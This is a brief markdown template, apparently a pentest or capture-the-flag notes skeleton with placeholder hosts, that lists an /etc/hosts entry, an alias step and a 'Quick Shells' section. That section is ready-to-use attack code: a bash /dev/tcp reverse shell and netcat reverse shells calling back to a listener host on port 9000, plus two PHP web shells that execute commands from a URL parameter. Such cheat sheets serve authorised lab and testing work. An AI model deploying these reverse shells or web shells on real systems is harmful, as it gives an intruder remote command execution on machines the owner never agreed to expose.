## {{TARGET}}

### Update `/etc/hosts`
```bash
{{RHOST}}   {{TARGET}}
```
 
### Set Aliases
```bash
nano ~/.bash_aliases
{{QUICK_DIR}}
source ~/.profile
```

### Quick Shells
#### Unix
```bash
bash -i >& /dev/tcp/{{LHOST}}/9000 0>&1
nc -e /bin/sh {{LHOST}} 9000
nc {{LHOST}} 9000
```

#### PHP
```php
<?php echo shell_exec($_GET['cmd']);?>
<?php echo system($_GET["cmd"]) ?>
```